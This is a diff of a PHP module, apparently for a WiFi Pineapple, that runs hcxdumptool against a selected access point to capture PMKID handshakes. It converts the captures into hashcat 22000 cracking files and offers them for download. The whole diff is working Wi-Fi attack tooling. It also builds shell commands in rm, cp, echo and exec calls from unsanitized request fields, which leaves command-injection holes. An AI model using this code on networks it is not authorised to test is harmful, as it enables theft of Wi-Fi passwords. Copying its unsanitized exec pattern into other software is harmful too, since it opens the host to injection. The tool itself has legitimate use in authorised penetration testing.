@@ -12,7 +12,8 @@ class PMKIDAttack extends Module
     const TOOLS_SD_PATH = "/sd/sbin/";
 
     private $pineAPHelper;
-    private $modulePath;
+    private $moduleFolder;
+    private $captureFolder;
     private $logPath;
     private $hcxdumptoolPath;
     private $hcxpcaptoolPath;
@@ -22,8 +23,9 @@ class PMKIDAttack extends Module
         parent::__construct($request, $moduleClass);
 
         $this->pineAPHelper = new PineAPHelper();
-        $this->modulePath = $this->getPathModule();
-        $this->logPath = $this->getPathModule() . "/log/module.log";
+        $this->moduleFolder = $this->getPathModule();
+        $this->captureFolder = "{$this->moduleFolder}/pcapng";
+        $this->logPath = "{$this->moduleFolder}/log/module.log";
         $this->hcxdumptoolPath = $this->getToolPath("hcxdumptool");
         $this->hcxpcaptoolPath = $this->getToolPath("hcxpcaptool"); // old name hcxpcaptool
     }
@@ -64,8 +66,8 @@ class PMKIDAttack extends Module
             case "deletePMKID":
                 $this->deletePMKID();
                 break;
-            case "getOutput":
-                $this->getOutput();
+            case "viewAttackLog":
+                $this->viewAttackLog();
                 break;
             case "getStatusAttack":
                 $this->getStatusAttack();
@@ -112,7 +114,7 @@ class PMKIDAttack extends Module
 
     protected function formatLog($massage)
     {
-        return "[" . date("Y-m-d H:i:s") . "] " . $massage . PHP_EOL;
+        return "[" . date("Y-m-d H:i:s") . "] {$massage}\n";
     }
 
     protected function getDependenciesStatus()
@@ -155,7 +157,7 @@ class PMKIDAttack extends Module
     {
         $this->stopAttack();
         $action = $this->checkDependencyInstalled() ? "remove" : "install";
-        $this->execBackground("{$this->modulePath}/scripts/dependencies.sh {$action}");
+        $this->execBackground("{$this->moduleFolder}/scripts/dependencies.sh {$action}");
         $this->response = array("success" => true);
     }
 
@@ -168,39 +170,47 @@ class PMKIDAttack extends Module
     {
         $this->pineAPHelper->disablePineAP();
 
-        //$this->execBackground("{$this->modulePath}/scripts/PMKIDAttack.sh start " . $this->request->bssid);
+        //$this->execBackground("{$this->moduleFolder}/scripts/PMKIDAttack.sh start " . $this->request->bssid);
+        $this->uciSet("pmkidattack.@config[0].ssid", $this->request->ssid);
         $this->uciSet("pmkidattack.@config[0].bssid", $this->request->bssid);
         $this->uciSet("pmkidattack.@config[0].attack", "1");
 
-        $BSSID = $this->getFormatBSSID();
-        exec("echo {$BSSID} > {$this->modulePath}/scripts/filter.txt");
+        $BSSID = $this->getBSSID(true);
+        exec("echo {$BSSID} > {$this->moduleFolder}/scripts/filter.txt");
         $this->execBackground(
             "{$this->hcxdumptoolPath} " . 
             "-o /tmp/{$BSSID}.pcapng " .
             "-i wlan1mon " .
-            "--filterlist_ap={$this->modulePath}/scripts/filter.txt " .
+            "--filterlist_ap={$this->moduleFolder}/scripts/filter.txt " .
             "--filtermode=2 " .
             "--enable_status=1 &> /dev/null &"
         );
 
-        $this->addLog("Start attack " . $this->getBSSID());
+        $this->addLog("Start attack {$this->request->bssid}");
         $this->response = array("success" => true);
     }
 
     protected function stopAttack()
     {
-        $BSSID = $this->getFormatBSSID();
+        $BSSID = $this->getBSSID(true);
+        $BSSIDFormatted = $this->getBSSID();
 
-        //$this->execBackground("{$this->modulePath}/scripts/PMKIDAttack.sh stop");
+        //$this->execBackground("{$this->moduleFolder}/scripts/PMKIDAttack.sh stop");
         exec("/usr/bin/pkill hcxdumptool");
         if ($this->checkPMKID()) {
-            exec("cp /tmp/{$BSSID}.pcapng {$this->modulePath}/pcapng/");
+            $metadata = json_encode([
+                'ssid' => $this->uciGet("pmkidattack.@config[0].ssid"),
+                'bssid' => $BSSIDFormatted
+            ]);
+            file_put_contents("{$this->captureFolder}/{$BSSID}.data", $metadata);
+            exec("cp /tmp/{$BSSID}.pcapng {$this->captureFolder}/");
         }
         exec("rm /tmp/{$BSSID}.pcapng /tmp/pmkid-output.txt");
 
+        $this->uciSet("pmkidattack.@config[0].ssid", "");
         $this->uciSet("pmkidattack.@config[0].bssid", "");
         $this->uciSet("pmkidattack.@config[0].attack", "0");
-        $this->addLog("Stop attack " . $this->getBSSID());
+        $this->addLog("Stop attack {$BSSIDFormatted}");
 
         $this->response = array("success" => true);
     }
@@ -219,25 +229,20 @@ class PMKIDAttack extends Module
         );
     }
 
-    protected function getFormatBSSID()
+    protected function getBSSID($clean = false)
     {
-        $bssid = $this->uciGet("pmkidattack.@config[0].bssid");      
+        $bssid = $this->uciGet("pmkidattack.@config[0].bssid");
 
-        return str_replace(":", "", $bssid);
-    }
-
-    protected function getBSSID()
-    {
-        return $this->uciGet("pmkidattack.@config[0].bssid");
+        return $clean ? str_replace(":", "", $bssid) : $bssid;
     }
 
     protected function checkPMKID()
     {
-        $BSSID = $this->getFormatBSSID();
+        $BSSID = $this->getBSSID(true);
 
         // hcxpcaptool 6.0   : -z <file> : output PMKID file (hashcat hashmode -m 16800 old format and john)
         // hcxpcapngtool 6.1 : -o <file> : output WPA-PBKDF2-PMKID+EAPOL (hashcat -m 22000)hash file
-        //exec("{$this->modulePath}/scripts/PMKIDAttack.sh check-bg " . $this->getFormatBSSID());
+        //exec("{$this->moduleFolder}/scripts/PMKIDAttack.sh check-bg " . $this->getBSSID(true));
         exec("{$this->hcxpcaptoolPath} -o /tmp/pmkid-handshake.tmp /tmp/{$BSSID}.pcapng &> /tmp/pmkid-output.txt");
         $file = file_get_contents("/tmp/pmkid-output.txt");
         exec("rm /tmp/pmkid-handshake.tmp");
@@ -249,10 +254,19 @@ class PMKIDAttack extends Module
     protected function getPMKIDFiles()
     {
         $pmkids = [];
-        foreach (glob("{$this->modulePath}/pcapng/*.pcapng") as $file) {
+        foreach (glob("{$this->captureFolder}/*.pcapng") as $capture) {
+            $file = basename($capture, ".pcapng");
+            $metadata = file_get_contents("{$this->captureFolder}/{$file}.data");
+            if ($metadata) {
+                $captureMetadata = json_decode($metadata, true);
+                $name = "{$captureMetadata['ssid']} ({$captureMetadata['bssid']})";
+            } else {
+                $name = implode(str_split($file, 2), ":");
+            }
+
             $pmkids[] = [
-                "path" => $file,
-                "name" => implode(str_split(basename($file, ".pcapng"), 2), ":")
+                "file" => $file,
+                "name" => $name
             ];
         }
 
@@ -262,26 +276,28 @@ class PMKIDAttack extends Module
     protected function downloadPMKID()
     {
         $file = $this->request->file;
-        $fileName = basename($this->request->file, ".pcapng");
+        $workingDir = "/tmp/PMKIDAttack";
 
-        exec("mkdir /tmp/PMKIDAttack/");
-        exec("cp {$file} /tmp/PMKIDAttack/");
-        exec("{$this->hcxpcaptoolPath} -o /tmp/PMKIDAttack/pmkid.22000 {$file} &> /tmp/PMKIDAttack/pmkid-download-output.txt");
-        exec("cd /tmp/PMKIDAttack/ && tar -czf /tmp/{$fileName}.tar.gz *");
-        exec("rm -rf /tmp/PMKIDAttack/");
+        exec("mkdir {$workingDir}");
+        exec("cp {$this->captureFolder}/{$file}.pcapng {$workingDir}/");
+        exec("{$this->hcxpcaptoolPath} -o {$workingDir}/pmkid.22000 {$workingDir}/{$file}.pcapng &> {$workingDir}/report.txt");
+        exec("cd {$workingDir}/ && tar -czf /tmp/{$file}.tar.gz *");
+        exec("rm -rf {$workingDir}/");
 
-        $this->response = array("download" => $this->downloadFile("/tmp/{$fileName}.tar.gz"));
+        $this->response = array("download" => $this->downloadFile("/tmp/{$file}.tar.gz"));
     }
 
     protected function deletePMKID()
     {
-        exec("rm {$this->request->file}");
+        $file = $this->request->file;
+        exec("rm {$this->captureFolder}/{$file}.pcapng {$this->captureFolder}/{$file}.data");
     }
 
-    protected function getOutput()
+    protected function viewAttackLog()
     {
-        if (!empty($this->request->pathPMKID)) {
-            exec("{$this->hcxpcaptoolPath} -o /tmp/pmkid-handshake.tmp {$this->request->pathPMKID} &> /tmp/pmkid-old-output.txt");
+        $file = $this->request->file;
+        if (!empty($file)) {
+            exec("{$this->hcxpcaptoolPath} -o /tmp/pmkid-handshake.tmp {$this->captureFolder}/{$file}.pcapng &> /tmp/pmkid-old-output.txt");
             $output = file_get_contents("/tmp/pmkid-old-output.txt");
             exec("rm /tmp/pmkid-old-output.txt");
         } else {
@@ -294,6 +310,7 @@ class PMKIDAttack extends Module
     protected function getStatusAttack()
     {
         $this->response = array(
+            "ssid" => $this->uciGet("pmkidattack.@config[0].ssid"),
             "bssid" => $this->uciGet("pmkidattack.@config[0].bssid"),
             "success" => $this->uciGet("pmkidattack.@config[0].attack") === true,
         );
